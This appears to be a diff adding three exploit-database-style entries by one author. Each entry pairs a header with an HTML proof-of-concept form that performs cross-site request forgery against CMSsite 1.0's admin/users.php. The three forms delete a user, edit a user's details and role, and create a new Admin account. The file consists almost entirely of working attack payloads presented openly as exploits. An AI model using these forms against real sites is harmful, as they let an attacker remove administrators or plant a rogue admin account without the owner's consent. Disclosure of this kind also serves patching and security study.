@@ -1,0 +1,149 @@
+# Exploit Title: CMSsite 1.0 - Cross-Site Request Forgery (Delete Admin)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link : https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+# PoC:
+
+<!doctype html>
+<html>
+<head>
+	<title>Delete Admin</title>
+</head>
+    <body>
+        <form method="post" action="http://localhost/[PATH]/admin/users.php?del=1">
+        	<input type="submit" value="Delete">
+        </form> 
+    </body>
+</html>
+
+
+# Exploit Title: CMSsite 1.0 - Cross-Site Request Forgery (Edit Admin)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link : https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+# PoC:
+
+<!doctype html>
+<html>
+<head>
+    <title>Edit Admin</title>
+</head>
+<body>
+      <form role="form" action="http://localhost/[PATH]/admin/users.php?source=edit_user&u_id=10" method="POST" enctype="multipart/form-data" >
+
+      	<!-- You can change u_id value -->
+
+<div class="form-group">
+		<label for="user_title">User Name</label>
+		<input type="text" name="user_name" required>
+	</div><br>
+
+	<div class="form-group">
+		<label for="user_author">FirstName</label>
+		<input type="text" name="user_firstname" required>
+	</div><br>
+
+	<div class="form-group">
+		<label for="user_status">LastName</label>
+		<input type="text" name="user_lastname" required>
+	</div><br>
+	
+		<div class="input-group">
+		<select name="user_role" id="">
+		    <label for="user_role">Role</label>
+		    <option value='User'>Admin</option>
+		    <option value='User'>User</option>
+	    </select>
+	    
+	</div><br>
+		<div class="form-group">
+		<label for="post_image">User Image</label>
+		<input type="file" name="user_image">
+	</div><br>
+	
+	<div class="form-group">
+		<label for="user_tag">Email</label>
+		<input type="email" name="user_email" class="form-control"required>
+	</div><br>
+	
+	<div class="form-group">
+		<label for="user_tag">Password</label>
+		<input type="password" name="user_password" required>
+	</div><br>
+    <hr>
+
+    <button type="submit" name="update_user" value="Update User">Update User</button>
+
+    </form>
+</body>
+</html>
+
+
+# Exploit Title: CMSsite 1.0 - Cross-Site Request Forgery (Add Admin)
+# Exploit Author: Mr Winst0n
+# Author E-mail: manamtabeshekan[@]gmail[.]com
+# Discovery Date: March 1, 2019
+# Vendor Homepage: https://github.com/VictorAlagwu/CMSsite
+# Software Link : https://github.com/VictorAlagwu/CMSsite/archive/master.zip
+# Tested Version: 1.0
+# Tested on: Kali linux, Windows 8.1 
+
+# PoC:
+
+<html>
+<head>
+    <title>Add Admin</title>
+</head>
+<body>
+<form role="form" action="http://localhost/[PATH]/admin/users.php?source=add_user" method="POST" enctype="multipart/form-data">
+
+    <div class="form-group">
+        <label for="user_title">User Name</label>
+        <input type="text" name="user_name" required><br><br>
+    </div>
+
+    <div class="form-group">
+        <label for="user_author">FirstName</label>
+        <input type="text" name="user_firstname" required><br><br>
+    </div>
+
+    <div class="form-group">
+        <label for="user_status">LastName</label>
+        <input type="text" name="user_lastname" required><br><br>
+    </div>
+
+    <div class="form-group">
+        <label for="user_image">Image</label>
+        <input type="file" name="user_image" required><br><br>
+    </div>
+    <div class="input-group">
+        <select name="user_role" id="">
+            <label for="user_role">Role</label>
+            <option value='Admin'>Admin</option><option value='User'>User</option>
+        </select><br><br>
+    </div>
+    <div class="form-group">
+        <label for="user_tag">Email</label>
+        <input type="email" name="user_email" required><br><br>
+
+    </div>
+    <div class="form-group">
+        <label for="user_tag">Password</label>
+        <input type="password" name="user_password" required><br><br>
+    </div>
+
+    <button type="submit" name="create_user" value="Add User">Add User</button>
+
+</form>
+</body>
+</html>
